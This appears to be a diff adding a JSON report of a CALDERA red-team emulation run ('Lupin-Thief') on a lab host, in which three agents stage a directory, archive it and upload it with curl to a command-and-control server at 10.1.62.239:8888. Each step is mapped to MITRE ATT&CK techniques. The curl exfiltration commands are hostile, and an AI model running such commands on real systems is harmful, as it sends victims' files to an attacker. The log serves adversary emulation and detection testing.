@@ -1,0 +1,407 @@
+[
+  {
+    "command": "mkdir -p staged && echo $PWD/staged",
+    "plaintext_command": "mkdir -p staged && echo $PWD/staged",
+    "delegated_timestamp": "2023-05-05T15:53:07Z",
+    "collected_timestamp": "2023-05-05T15:53:25Z",
+    "finished_timestamp": "2023-05-05T15:53:25Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65224,
+    "agent_metadata": {
+      "paw": "qtsxfp",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/sandcat.go-linux",
+      "pid": 64436,
+      "ppid": 64405,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:50:17Z"
+    },
+    "ability_metadata": {
+      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "ability_name": "Create staging directory",
+      "ability_description": "create a directory for exfil staging"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Data Staged: Local Data Staging",
+      "technique_id": "T1074.001"
+    },
+    "output": {
+      "stdout": "/home/ubuntu/staged",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:53:25Z"
+  },
+  {
+    "command": "mkdir -p staged && echo $PWD/staged",
+    "plaintext_command": "mkdir -p staged && echo $PWD/staged",
+    "delegated_timestamp": "2023-05-05T15:53:07Z",
+    "collected_timestamp": "2023-05-05T15:53:17Z",
+    "finished_timestamp": "2023-05-05T15:53:17Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65220,
+    "agent_metadata": {
+      "paw": "jcwdsq",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/caldera",
+      "pid": 65153,
+      "ppid": 65125,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:50:45Z"
+    },
+    "ability_metadata": {
+      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "ability_name": "Create staging directory",
+      "ability_description": "create a directory for exfil staging"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Data Staged: Local Data Staging",
+      "technique_id": "T1074.001"
+    },
+    "output": {
+      "stdout": "/home/ubuntu/staged",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:53:17Z"
+  },
+  {
+    "command": "mkdir -p staged && echo $PWD/staged",
+    "plaintext_command": "mkdir -p staged && echo $PWD/staged",
+    "delegated_timestamp": "2023-05-05T15:53:07Z",
+    "collected_timestamp": "2023-05-05T15:53:39Z",
+    "finished_timestamp": "2023-05-05T15:53:39Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65226,
+    "agent_metadata": {
+      "paw": "gnayxz",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/sandcat.go-linux",
+      "pid": 65215,
+      "ppid": 65185,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:51:43Z"
+    },
+    "ability_metadata": {
+      "ability_id": "6469befa-748a-4b9c-a96d-f191fde47d89",
+      "ability_name": "Create staging directory",
+      "ability_description": "create a directory for exfil staging"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "collection",
+      "technique_name": "Data Staged: Local Data Staging",
+      "technique_id": "T1074.001"
+    },
+    "output": {
+      "stdout": "/home/ubuntu/staged",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:53:39Z"
+  },
+  {
+    "command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+    "plaintext_command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+    "delegated_timestamp": "2023-05-05T15:53:42Z",
+    "collected_timestamp": "2023-05-05T15:54:02Z",
+    "finished_timestamp": "2023-05-05T15:54:02Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65228,
+    "agent_metadata": {
+      "paw": "qtsxfp",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/sandcat.go-linux",
+      "pid": 64436,
+      "ppid": 64405,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:50:17Z"
+    },
+    "ability_metadata": {
+      "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+      "ability_name": "Compress staged directory",
+      "ability_description": "Compress a directory on the file system"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "exfiltration",
+      "technique_name": "Archive Collected Data: Archive via Utility",
+      "technique_id": "T1560.001"
+    },
+    "output": {
+      "stdout": "/home/ubuntu/staged.tar.gz",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:54:02Z"
+  },
+  {
+    "command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+    "plaintext_command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+    "delegated_timestamp": "2023-05-05T15:53:42Z",
+    "collected_timestamp": "2023-05-05T15:54:10Z",
+    "finished_timestamp": "2023-05-05T15:54:10Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65239,
+    "agent_metadata": {
+      "paw": "jcwdsq",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/caldera",
+      "pid": 65153,
+      "ppid": 65125,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:50:45Z"
+    },
+    "ability_metadata": {
+      "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+      "ability_name": "Compress staged directory",
+      "ability_description": "Compress a directory on the file system"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "exfiltration",
+      "technique_name": "Archive Collected Data: Archive via Utility",
+      "technique_id": "T1560.001"
+    },
+    "output": {
+      "stdout": "/home/ubuntu/staged.tar.gz",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:54:10Z"
+  },
+  {
+    "command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+    "plaintext_command": "tar -P -zcf /home/ubuntu/staged.tar.gz /home/ubuntu/staged && echo /home/ubuntu/staged.tar.gz",
+    "delegated_timestamp": "2023-05-05T15:53:42Z",
+    "collected_timestamp": "2023-05-05T15:54:37Z",
+    "finished_timestamp": "2023-05-05T15:54:37Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65243,
+    "agent_metadata": {
+      "paw": "gnayxz",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/sandcat.go-linux",
+      "pid": 65215,
+      "ppid": 65185,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:51:43Z"
+    },
+    "ability_metadata": {
+      "ability_id": "300157e5-f4ad-4569-b533-9d1fa0e74d74",
+      "ability_name": "Compress staged directory",
+      "ability_description": "Compress a directory on the file system"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "exfiltration",
+      "technique_name": "Archive Collected Data: Archive via Utility",
+      "technique_id": "T1560.001"
+    },
+    "output": {
+      "stdout": "/home/ubuntu/staged.tar.gz",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:54:37Z"
+  },
+  {
+    "command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-qtsxfp\" http://10.1.62.239:8888/file/upload",
+    "plaintext_command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-qtsxfp\" http://10.1.62.239:8888/file/upload",
+    "delegated_timestamp": "2023-05-05T15:54:42Z",
+    "collected_timestamp": "2023-05-05T15:55:06Z",
+    "finished_timestamp": "2023-05-05T15:55:06Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65254,
+    "agent_metadata": {
+      "paw": "qtsxfp",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/sandcat.go-linux",
+      "pid": 64436,
+      "ppid": 64405,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:50:17Z"
+    },
+    "ability_metadata": {
+      "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+      "ability_name": "Exfil staged directory",
+      "ability_description": "Exfil the staged directory"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "exfiltration",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "technique_id": "T1041"
+    },
+    "output": {
+      "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   331    0     0  100   331      0   111k --:--:-- --:--:-- --:--:--  161k",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:55:06Z"
+  },
+  {
+    "command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-jcwdsq\" http://10.1.62.239:8888/file/upload",
+    "plaintext_command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-jcwdsq\" http://10.1.62.239:8888/file/upload",
+    "delegated_timestamp": "2023-05-05T15:54:42Z",
+    "collected_timestamp": "2023-05-05T15:55:10Z",
+    "finished_timestamp": "2023-05-05T15:55:10Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65257,
+    "agent_metadata": {
+      "paw": "jcwdsq",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/caldera",
+      "pid": 65153,
+      "ppid": 65125,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:50:45Z"
+    },
+    "ability_metadata": {
+      "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+      "ability_name": "Exfil staged directory",
+      "ability_description": "Exfil the staged directory"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "exfiltration",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "technique_id": "T1041"
+    },
+    "output": {
+      "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   331    0     0  100   331      0   150k --:--:-- --:--:-- --:--:--  323k",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:55:10Z"
+  },
+  {
+    "command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-gnayxz\" http://10.1.62.239:8888/file/upload",
+    "plaintext_command": "curl -F \"data=@/home/ubuntu/staged.tar.gz\" --header \"X-Request-ID: `hostname`-gnayxz\" http://10.1.62.239:8888/file/upload",
+    "delegated_timestamp": "2023-05-05T15:54:42Z",
+    "collected_timestamp": "2023-05-05T15:55:25Z",
+    "finished_timestamp": "2023-05-05T15:55:25Z",
+    "status": 0,
+    "platform": "linux",
+    "executor": "sh",
+    "pid": 65260,
+    "agent_metadata": {
+      "paw": "gnayxz",
+      "group": "red",
+      "architecture": "amd64",
+      "username": "ubuntu",
+      "location": "/home/ubuntu/sandcat.go-linux",
+      "pid": 65215,
+      "ppid": 65185,
+      "privilege": "User",
+      "host": "caldera-target",
+      "contact": "HTTP",
+      "created": "2023-05-05T15:51:43Z"
+    },
+    "ability_metadata": {
+      "ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
+      "ability_name": "Exfil staged directory",
+      "ability_description": "Exfil the staged directory"
+    },
+    "operation_metadata": {
+      "operation_name": "Lupin-Thief",
+      "operation_start": "2023-05-05T15:53:06Z",
+      "operation_adversary": "Thief"
+    },
+    "attack_metadata": {
+      "tactic": "exfiltration",
+      "technique_name": "Exfiltration Over C2 Channel",
+      "technique_id": "T1041"
+    },
+    "output": {
+      "stdout": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100   331    0     0  100   331      0  78158 --:--:-- --:--:-- --:--:-- 82750",
+      "stderr": "",
+      "exit_code": ""
+    },
+    "agent_reported_time": "2023-05-05T15:55:25Z"
+  }
+]
